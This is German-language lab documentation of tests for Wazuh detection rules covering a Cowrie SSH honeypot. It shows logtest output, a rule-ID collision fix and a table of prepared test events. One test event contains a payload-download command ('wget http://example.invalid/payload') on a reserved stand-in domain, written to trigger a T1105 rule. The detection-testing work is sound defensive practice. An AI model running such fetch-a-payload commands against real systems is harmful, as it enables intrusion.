# Regeltests mit `wazuh-logtest`

Jede Regel wurde bzw. wird vor dem Neustart des Wazuh-Managers mit `wazuh-logtest` geprüft,
statt Regeln „blind" zu ändern.

```bash
sudo /var/ossec/bin/wazuh-logtest
# eine JSON-Zeile einfügen, Enter; Beenden mit Ctrl+C
```

## Verifizierte Ergebnisse (Phase 1)

### 1. Pipeline-Testregel 110201 (verifiziert)

Eingabe:

```json
{"eventid":"lab.wazuh.test","src_ip":"<HONEYPOT_TAILSCALE_IP>","sensor":"honeypot-vps","username":"root","message":"Wazuh honeypot ingestion test"}
```

Ausgabe (gekürzt, IP ersetzt):

```text
**Phase 2: Completed decoding.
        name: 'json'
        eventid: 'lab.wazuh.test'
        message: 'Wazuh honeypot ingestion test'
        sensor: 'honeypot-vps'
        src_ip: '<HONEYPOT_TAILSCALE_IP>'
        username: 'root'

**Phase 3: Completed filtering (rules).
        id: '110201'
        level: '5'
        description: 'Honeypot Wazuh ingestion test from <HONEYPOT_TAILSCALE_IP>'
        groups: '['honeypot', 'cowrie']'
        firedtimes: '1'
        mail: 'False'
**Alert to be generated.
```

Der erste Versuch mit den IDs `100200/100201` lieferte stattdessen:

```text
** Wazuh-Logtest: WARNING: (7612): Rule ID '100200' is duplicated. Only the first occurrence will be considered.
```

→ Kollision mit einer bestehenden Regel aus einem früheren Lab; Lösung: eigener ID-Bereich `1102xx`.

### 2. Command-Regel 110214 (live verifiziert)

Reale Alerts aus `/var/ossec/logs/alerts/alerts.json` (lokaler Test, gekürzt):

```json
{"rule":{"level":5,"description":"Cowrie: Command executed by 127.0.0.1: uname -a","id":"110214",
 "mitre":{"id":["T1059"],"tactic":["Execution"],"technique":["Command and Scripting Interpreter"]},
 "groups":["honeypot","cowrie"]},
 "decoder":{"name":"json"},
 "data":{"eventid":"cowrie.command.input","input":"uname -a","sensor":"honeypot-vps","@source":"cowrie-honeypot"},
 "location":"/var/log/honeypot/cowrie.json"}
```

Später identisch mit externer Quelle (öffentlicher Test über TCP/22) für `whoami`, `id`, `uname -a`, `pwd`, `exit`.

## Noch zu verifizieren (Phase 2)

Die folgenden Testereignisse sind vorbereitet. Ihre Ergebnisse sind im Projektverlauf **nicht belegt**
und werden in Phase 2 dokumentiert. Die URL verwendet bewusst die reservierte Domain `.invalid`.

| Regel | Test-Ereignis | Erwartung |
|---|---|---|
| 110215 | `{"session":"test123","protocol":"ssh","src_ip":"203.0.113.50","src_port":54321,"dst_ip":"<HONEYPOT_PUBLIC_IP>","dst_port":22,"input":"wget http://example.invalid/payload","eventid":"cowrie.command.input","sensor":"honeypot-vps","timestamp":"2026-09-23T20:30:00Z","message":"CMD: wget http://example.invalid/payload"}` | id `110215`, level `8`, MITRE T1105 |
| 110213 | `{"session":"test456","protocol":"ssh","src_ip":"203.0.113.51","src_port":54322,"dst_ip":"<HONEYPOT_PUBLIC_IP>","dst_port":22,"username":"root","password":"<REDACTED_PASSWORD>","eventid":"cowrie.login.success","sensor":"honeypot-vps","timestamp":"2026-09-23T20:31:00Z","message":"login attempt succeeded"}` | id `110213`, level `7` (live bereits über das Dashboard belegt) |
| 110212 | wie oben mit `"eventid":"cowrie.login.failed"` | id `110212`, level `4` |
| 110219 | 5× `cowrie.login.failed` derselben `src_ip` innerhalb von 120 s | id `110219`, level `8`, MITRE T1110 |
| 110218 | `sanitized-events.jsonl`, Event `cowrie.command.failed` | id `110218`, level `4` |

`203.0.113.0/24` ist ein Dokumentations-Adressbereich (RFC 5737) und gehört keinem realen System.
